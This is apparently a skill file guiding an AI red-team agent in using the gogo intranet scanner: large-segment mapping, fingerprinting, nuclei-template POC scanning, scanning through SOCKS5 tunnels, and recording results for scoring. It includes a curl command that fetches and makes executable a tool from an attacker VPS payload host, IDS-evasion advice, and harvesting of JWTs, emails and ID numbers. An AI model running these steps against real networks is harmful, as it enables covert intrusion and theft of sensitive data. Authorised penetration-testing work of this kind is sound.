---
name: gogo-intranet
description: gogo v2.15.0 high-performance intranet scanning engine: smart/supersmart modes, active+passive fingerprinting, key information extraction (title/cert/JWT/email/ID), nuclei-template POC, controllable low-noise packet sending
whenToUse: After entering the intranet to quickly map large segments (/16 /12), need fingerprints and key information, and want minimal packet noise
role: internal
enabled: true
---

# gogo (intranet mapping and fingerprinting engine)

`gogo` = **high-concurrency, low-noise, highly configurable mapping engine**. Designed for red-team intranet scenarios:
minimum packet principle, active+passive fingerprinting, key information extraction, kernel-level POC engine (neutron, compatible with nuclei templates),
supports custom DSL/workflows. **Map with gogo first, then exploit with fscan.**

## Division of labor with fscan

| | gogo | fscan |
| --- | --- | --- |
| Strengths | Large-segment mapping, fingerprinting, information extraction, controllable packet volume | Weak-password brute force, unauthorized access, high-risk vulns, exploitation |
| Default noise | Low (`--opsec`, tunable threads/timeout) | High (600 threads + brute force + POC all on) |
| Output | `.dat` (deflate JSON Lines) + formatted | txt/json/csv |
| Typical usage | `gogo -i 10.0.0.0/8 -m ss --ping -p top2,win,db --af` | `fscan -h 10.0.0.0/24 -nobr -nopoc` |

## Binaries

```
Local : $DSH_HOME/redteam/toolkit/gogo/gogo                (v2.15.0, 4.3MB, 3138 built-in fingerprints)
        $DSH_HOME/redteam/toolkit/gogo/gogo_windows_amd64.exe
        $DSH_HOME/redteam/toolkit/gogo/gogo_linux_arm64
VPS   : http://<your-vps-ip>:9100/gogo                      (payload directory from skill vps-reverse-shell)
Docs  : https://chainreactors.github.io/wiki/gogo/
Templates: https://github.com/chainreactors/templates

# Transfer to jump host/target for execution
curl -o gogo http://<your-vps-ip>:9100/gogo && chmod +x gogo
```

The install script does not download gogo; place it at the main file path manually. Windows and ARM files must also be added manually; use the main file above on the current platform.

**Zero dependencies**: single static binary with built-in fingerprints and extraction rules; runs even on Windows 2003. **No** extra config files required.

## Discipline

1. **Scope**: use `--exclude` / `--exclude-file` to exclude out-of-scope segments; do not scan office networks or cloud metadata segments.
2. **Recon first, scan second**: `ip a; ip route; arp -a; cat /etc/hosts` — intranet topology often saves half the scanning.
3. **OPSEC**: add `--opsec` in sensitive environments, reduce threads to `-t 200~500`, timeout `-d 3`; for large segments always use `--ping` first to filter.
4. **Do not use `-p -` (all ports) on large segments**—that is suicidal packet volume; start with `top2`, then full-port on live hosts.

## Core concepts

### Port presets (the soul of this tool)

```bash
gogo -P port        # list all preset tags and corresponding ports
```

Common tags: `top1`(80,443,8080) · `top2`(hundreds of common web/service ports) · `top3` · `common`(common intranet) ·
`win`(135,137,445,3389,winrm,oxid) · `db` · `http` · `docker` · `oracle` · `smb` · `all`(full set)

```bash
port combinations: -p top2,win,db          # comma-separated combinations
port ranges:       -p 1-1000               # range
all ports:         -p -                    # equivalent to 1-65535 (use with caution)
single ports:      -p 6379,mysql,12345
```

### Three scan modes

| Mode | Flag | Use case |
| --- | --- | --- |
| default | (default) | Single IP / small segment (/24 or smaller) |
| smart | `-m s` | /24–/16, AB-segment probing + heuristic expansion |
| supersmart | `-m ss` | /16+ large intranets, probe points then filter segments |
| sc | `-m sc` | Known target segments needing finer port coverage |

```bash
gogo -i 192.168.1.0/24 -m s  --ping -p top2,win,db --af
gogo -i 10.0.0.0/8    -m ss --ping -p top2,win,db --af
```

### Workflow (save complex commands as presets)

```bash
gogo -P workflow     # list all workflows
gogo -w 10           # equivalent to supersmart full flow for 10.0.0.0/8 (all ports)
gogo -w 172          # 172.16.0.0/12
gogo -w 192          # 192.168.0.0/16
gogo -w interc       # common intranet C segments (10/172/192)
gogo -w 10 -i 11.0.0.0/8 -p top2   # CLI args can override workflow parameters
```

## Parameter quick reference (tested v2.15.0 `-h`)

> **Multi-character long flags require double dashes**: `--ipp`, `--sp`, `--ef`, `--af`. Single dash is only for single-char flags like `-i/-p/-m/-t/-d/-e/-v/-w/-F/-l/-L/-j`.

**Input**
```
-i/--ip   192.168.1.1/24,172.16.1.1/24   targets, comma-separated
--exclude 10.0.0.1/24        --exclude-file <file>
-l <file> target list file   -L  read targets from stdin
-j <file> reuse previous results (.dat) or ip:port list for deeper scan     -J  read from stdin
```

**Output**
```
-f <file>        output filename         --path  output directory
-o <fmt>         console output format   -O <fmt>  file output format (default jsonlines)
--af             auto-name output file (.dat, deflate JSON Lines)
--hf             auto-name hidden file   -C  disable compression      --tee  also keep console output
-q/--quiet       disable logs, keep results only (required when chaining with other tools)
-F <file>        format existing .dat results
--filter / --output-filter / --scan-filter   historical filter / realtime filter / early stop
```

**Smart scanning**
```
-m/--mod  default|s|ss|sc    scan mode
--ping                       ICMP prefilter first (required for large segments)
-n/--no                      smart scan only, do not enter default scan
--sp   smart port probe (default 80, ss mode defaults to icmp)
--ipp  AB-segment IP probes (default 1,254)
```

**Performance and stealth**
```
-t/--thread <n>     concurrency (linux default 4000, intranet recommended 200~1000)
-d/--timeout <sec>  timeout (default 2)
-D/--ssl-timeout    SSL timeout
--opsec             low-noise mode (enable in sensitive environments)
-s/--spray          port-first spraying (auto-enabled when ports >500)
--no-spray          force disable spraying
```

**Fingerprinting and extraction**
```
-v/--verbose         active fingerprint identification (without this, passive only—less info but quieter)
--ff <file>          custom fingerprint library
--extract "<regex>"  custom extraction regex
gogo -P extract      view built-in extraction rules (jwt / mail / idcard / phone / ip etc.)
```

**Vulnerabilities (neutron kernel)**
```
-e/--exploit         enable POC scanning (combine with -v as -ev)
-E <name>            specify template name        --ef <file>  specify template file
--payload <s>        specify payload              --attack-type sniper|clusterbomb|pitchfork
```

**Proxy**
```
--proxy socks5://127.0.0.1:11111      # verified; works through suo5 / ssh -D tunnels
```

## Standard operating procedure (SOP)

```bash
# 0) Recon
ip a; ip route; arp -a; cat /etc/hosts /etc/resolv.conf

# 1) Large-segment mapping (quiet, prefilter live hosts, save to file)
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af -t 500 -d 3

# 2) View results (human-readable)
./gogo -F ./.10.0.0.0_16_top2_win_db_ss_dat

# 3) Full ports + active fingerprinting on live hosts
./gogo -i 10.0.1.0/24 -p - -v -t 1000 -d 3 --af

# 4) Targeted POC (only against targets with confirmed fingerprints)
./gogo -i 10.0.1.5,10.0.1.9 -p top2 -ev -E <template-name>

# 5) Reuse previous results for deeper scan (no rescan needed)
./gogo -j ./step1.dat -p 1-65535 -v -e
```

### Mapping through tunnel (primary intranet path)

```bash
# Prerequisite: SOCKS5 established via skill suo5-tunnel, or ssh -D in vps-reverse-shell
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af \
       --proxy socks5://127.0.0.1:1080 -t 300 -d 5 -q

# Verified: gogo --proxy socks5:// truly sends traffic through the tunnel
```

In tunnel scenarios, reduce `-t` to 300 or below and increase `-d` to 5; otherwise packet loss causes false negatives.

## Record results to database (required)

gogo `.dat` is compressed JSON Lines; format first, then parse and store:

```bash
./gogo -F ./result.dat -o json -f result.json      # convert to JSON
python3 tools/parse.py result.json
# Parsing notes: top-level is {config, ip, data:[...]}, each item has ip/port/protocol/status/frameworks/title/timing
```
```python
import json
d = json.load(open('result.json', encoding='utf-8'))
for it in d.get('data', []):
    fw = ','.join((it.get('frameworks') or {}).keys())
    print(it.get('ip'), it.get('port'), it.get('protocol'), fw, it.get('title'))
```

```bash
# Storage discipline (same as fscan)
redteam_asset_add      { engagement, ip, port, service, title, source: "gogo", tags: [...] }
redteam_web_list       # web fingerprint skill supplements URL/title later
redteam_vuln_add       { engagement, target, name, severity, evidence_ref }   # must include evidence
```

**Note**: write gogo framework/fingerprint results into the asset `fingerprint` field; do not leave them only in terminal output.
Extracted sensitive information (email/ID/JWT) counts as a "large volume of sensitive information" scoring point—record with `redteam_vuln_add` +
`redteam_score_hit`, with evidence stored in `runs/`.

## Troubleshooting

| Symptom | Action |
| --- | --- |
| Parameter error | Long flags need double dashes (`--af`, not `-af`); `-P` only accepts `port/workflow/neutron/extract` |
| Result file not found | `--af` writes in the **binary's directory** by default; use `--path` to specify directory |
| Almost no results on large segment | `--ping` misses hosts that block ping; remove `--ping` or adjust probes with `--ipp` |
| Scan too slow | Increase `-t`, lower `-d`; use `top1`/`top2` for `-p`; use `-m ss` for large segments |
| Detected by IDS | `--opsec` + `-t 200` + `-d 3`; do not enable `-e`; do not use `-p -` |
| Many timeouts in tunnel | Lower `-t`, raise `-d`; tunnel bandwidth is the bottleneck |
| Want results only, no logs | `-q` (required when chaining with other tools) |

## Related skills

- `fscan-intranet`: brute force and exploitation after mapping
- `suo5-tunnel`: webshell → SOCKS5, provides `--proxy` entry for gogo
- `vps-reverse-shell`: tunneling and payload delivery
- `web-fingerprint` / `asset-correlation`: further correlate gogo results into an asset graph
